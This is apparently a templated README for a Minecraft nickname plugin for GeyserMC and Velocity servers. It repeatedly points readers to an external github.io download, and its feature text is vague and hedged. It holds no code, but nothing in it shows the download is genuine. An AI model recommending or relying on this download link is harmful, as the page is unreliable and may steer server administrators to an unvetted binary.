# Custom Names for GeyserMC v2026 - Game Script Utility 2026

> **Minecraft plugin for GeyserMC offline servers.** It provides nickname update management for Velocity-based environments once the required dependencies are in place.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-GeyserMC%20offline%20servers-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/edwardsevan55/geysermc-script-names?style=flat-square)](https://github.com/edwardsevan55/geysermc-script-names)

---

<p align="center">
  <a href="https://edwardsevan55.github.io/geysermc-script-names/">
    <img src="https://img.shields.io/badge/Download-Custom%20Names%20for%20GeyserMC%20Script-brightgreen?style=for-the-badge" alt="Download Custom Names for GeyserMC Script">
  </a>
</p>

> **[Direct Download - Custom Names for GeyserMC](https://edwardsevan55.github.io/geysermc-script-names/)**

---

[Download Latest Build](https://edwardsevan55.github.io/geysermc-script-names/)

---

## What this plugin does

Custom Names for GeyserMC is a server-side Minecraft plugin built to handle nickname updates in offline-mode setups that connect through GeyserMC. It is aimed at servers using Velocity and the necessary companion dependencies, giving administrators a straightforward way to keep name handling controlled from the server side.

Rather than relying on ad hoc edits, the plugin applies nickname behavior through configuration. It also supports bStats metrics and checks for dependencies, making it suitable for inclusion in a larger plugin stack where awareness of the host environment matters.

## Key Capabilities

- Handles nickname updates for GeyserMC offline servers
- Uses configuration-driven behavior for name processing
- Supports Velocity-compatible, proxy-based deployments
- Verifies that required components are installed
- Includes bStats metrics support for usage reporting
- Acts as a server-side utility for nickname management
- Works in Minecraft environments that use GeyserMC and related tools

## Installation

1. Download the latest build from the link above.
2. Put the plugin file into your server's `plugins` directory.
3. Start or restart the server so the plugin can generate and load its configuration.
4. Open the created config file and tune the nickname settings as needed.
5. If your setup relies on Velocity, confirm that the required dependencies are installed before enabling the plugin.

Example placement:

    server/
    └─ plugins/
       └─ CustomNamesForGeyserMC.jar

## Configuration Areas

Common configuration sections may cover nickname handling and dependency validation.

| Setting Area | Purpose |
| --- | --- |
| Nickname behavior | Controls how name updates are applied |
| Dependency checks | Verifies required server-side components |
| Metrics | Enables or disables bStats reporting |
| Velocity setup | Matches the plugin to a proxy-based environment |

If the build exposes config keys, keep them in the generated configuration file and edit them there instead of changing the jar.

## Compatibility Notes

This plugin is intended for Minecraft servers running in GeyserMC offline mode. It is also described as compatible with Velocity-based setups as long as the required dependencies are available.

Known limitations:
- It depends on the surrounding server and proxy stack being set up correctly.
- Features may vary based on installed dependencies and configuration.
- It is not presented as a client mod or standalone launcher tool.

## FAQ

### How do I install it?
Download the build, copy it into the server `plugins` folder, and restart the server. After that, review the generated configuration.

### Can I change how nicknames work?
Yes. Nickname handling is driven by configuration, so you should adjust it through the plugin's config files.

### Does it work with Velocity?
It is designed for Velocity-compatible setups, provided the required dependencies are installed.

### What does bStats do here?
bStats metrics support is included so the plugin can send usage statistics according to its configuration and the bStats service.

### Where are settings stored?
Settings are usually written to the plugin's generated configuration files inside the server data or plugin folder.

### What if a dependency is missing?
The plugin performs dependency checks, so make sure the required components are installed before depending on its features.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
